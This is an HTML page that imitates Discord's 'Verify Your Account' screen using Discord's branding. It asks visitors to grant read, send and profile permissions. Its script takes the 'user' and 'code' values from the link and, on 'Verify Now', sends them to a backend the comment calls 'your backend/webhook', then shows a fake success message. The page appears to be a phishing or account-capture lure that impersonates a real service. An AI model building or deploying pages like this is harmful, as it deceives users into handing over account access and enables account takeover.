<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Verify Account</title>
    <style>
        body {
            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background-color: #1e1f22;
            color: #dbdee1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2b2d31;
            border-radius: 5px;
            padding: 32px;
            width: 416px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
        }
        h2 {
            color: #f2f3f5;
            margin-top: 0;
            font-size: 20px;
        }
        p {
            font-size: 14px;
            color: #b5bbbf;
            margin-bottom: 24px;
        }
        .permission-list {
            list-style: none;
            padding: 0;
            margin-bottom: 24px;
        }
        .permission-list li {
            display: flex;
            align-items: center;
            font-size: 14px;
            margin-bottom: 8px;
        }
        .permission-list li::before {
            content: "✔️";
            margin-right: 8px;
            color: #43b581;
        }
        .btn {
            background-color: #3a7bd4;
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px 16px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            width: 100%;
            margin-bottom: 8px;
        }
        .btn:hover {
            background-color: #2a6ac4;
        }
        .btn-cancel {
            background-color: transparent;
            color: #b5bbbf;
        }
        .btn-cancel:hover {
            background-color: #393c43;
            color: #dbdee1;
        }
        .logo {
            width: 40px;
            height: 40px;
            margin-bottom: 16px;
        }
        .discord-logo {
            fill: #fff;
            width: 24px;
            height: 24px;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="display: flex; align-items: center; margin-bottom: 16px;">
            <svg class="discord-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.08 14.08 0 0 0 1.226-1.99.076.076 0 0 0-.041-.106 13.178 13.178 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.09.24.176.373.292a.077.077 0 0 1-.006.128 13.035 13.035 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.984 1.36 1.225 1.99a.077.077 0 0 0 .084.028 19.74 19.74 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.83-9.67-2.541-13.66a.07.07 0 0 0-.031-.028zM8.02 15.336c-1.178 0-2.156-1.085-2.156-2.419 0-1.333.956-2.419 2.156-2.419 1.178 0 2.156 1.085 2.156 2.419 0 1.333-.956 2.419-2.156 2.419zm7.974 0c-1.178 0-2.156-1.085-2.156-2.419 0-1.333.956-2.419 2.156-2.419 1.178 0 2.156 1.085 2.156 2.419 0 1.333-.956 2.419-2.156 2.419z"/>
            </svg>
            <span style="font-size: 16px; font-weight: 600;">Discord</span>
        </div>
        <h2>Verify Your Account</h2>
        <p>Do you want to verify your account? This process is secure and instant.</p>
        <ul class="permission-list">
            <li>Read your messages</li>
            <li>Send messages</li>
            <li>Manage your profile</li>
        </ul>
        <button class="btn" id="verify-btn">Verify Now</button>
        <button class="btn btn-cancel" id="cancel-btn">Cancel</button>
    </div>
    <script>
        const verifyBtn = document.getElementById('verify-btn');
        const cancelBtn = document.getElementById('cancel-btn');

        verifyBtn.addEventListener('click', async () => {
            const urlParams = new URLSearchParams(window.location.search);
            const user = urlParams.get('user');
            const code = urlParams.get('code');

            if (!user || !code) {
                alert('Invalid verification link.');
                return;
            }

            // Send the verification code to your backend/webhook
            const response = await fetch(`/api/verify?user=${user}&code=${code}`, {
                method: 'GET'
            });

            if (response.ok) {
                document.querySelector('.container').innerHTML = `
                    <div style="text-align: center;">
                        <svg class="discord-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="fill: #43b581; width: 48px; height: 48px; margin-bottom: 16px;">
                            <path d="M12 2L2 12l10 10 10-10L12 2z"/>
                        </svg>
                        <h2 style="color: #43b581;">Verified!</h2>
                        <p>Your account has been successfully verified.</p>
                        <p>You can now close this window.</p>
                    </div>
                `;
            } else {
                alert('Verification failed. Please try again.');
            }
        });

        cancelBtn.addEventListener('click', () => {
            window.close();
        });
    </script>
</body>
</html>
